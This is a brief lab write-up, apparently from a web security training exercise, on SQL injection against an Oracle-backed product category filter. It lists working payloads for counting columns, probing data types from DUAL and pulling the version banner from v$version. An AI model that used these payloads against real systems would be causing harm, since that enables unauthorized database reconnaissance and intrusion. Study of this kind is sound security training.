Lab-07 - SQL injection attack, querying the database type and version on Oracle

SQL Injection - Product category filter

End Goal - display the database version string

Analysis:

(1) Determine the number of columns
' order by 3 -- -> internal server error

3 - 1 = 2

(2) Determine the data types of the columns

' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database

(3) Output the version of the database

' UNION SELECT banner, NULL from v$version--

SELECT banner FROM v$version

script.py <url> 

